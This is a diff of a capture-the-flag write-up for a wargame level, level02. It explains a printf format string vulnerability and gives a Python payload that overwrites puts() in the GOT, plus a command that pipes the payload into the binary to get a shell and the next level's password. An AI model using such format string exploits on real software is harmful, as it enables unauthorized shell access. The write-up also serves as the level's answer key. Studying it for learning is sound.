@@ -1,7 +1,23 @@
-RDI, RSI, RDX, RCX, R8, R9
+* In this level02 the program asks for a username and password .
+* read the password from "/home/users/level03/.pass", and compare it with the password that we provide.
+* if the password is correct it display a greeting msg , and call system("/bin/sh", otherwise it passes the username as format string to printf
+ , followed by the msg "does not have access".
+* its clear that we have a format string vulnerability .
 
+* to pwn this level02 overwrite the the address of puts() with system().
+-------------------------------------------------------------
 
-the buffer does not get flushed , means the remaining characters (after 99) get stored in password
+# our format string is at the offset 28$.
+# 4196997 bin_sh
 
-frame size 0x120 = 288  
+import struct
 
+puts_got = struct.pack ("Q", 0x6011e0);
+puts_got2 = struct.pack ("Q", 0x6011e0 + 4);
+
+print "%33$nBBB" + "%4196987p" + "AAABBBB" + "%32$nAAA" + puts_got + puts_got2
+
+-------------------------------------------------------------
+# note : /tmp/lev02.py contain the above code
+
+===> (python /tmp/lev02.py; sleep 1 ; echo "admin"; cat ) | ./level02
